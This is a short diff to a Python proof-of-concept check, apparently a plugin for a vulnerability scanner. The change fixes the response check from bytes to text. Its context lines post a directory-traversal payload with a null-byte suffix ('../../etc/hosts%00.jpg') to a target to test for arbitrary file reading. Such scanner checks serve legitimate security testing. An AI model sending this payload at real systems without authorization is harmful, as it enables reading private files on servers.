@@ -52,7 +52,7 @@ class Poc(ABPoc):
             }
             data = '''logtype=../../../../../../../../../../etc/hosts%00.jpg '''
             response = requests.post(vul_url, headers=headers, data=data)
-            if response.status_code == 200 and 'localhost' in response.content:
+            if response.status_code == 200 and 'localhost' in response.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
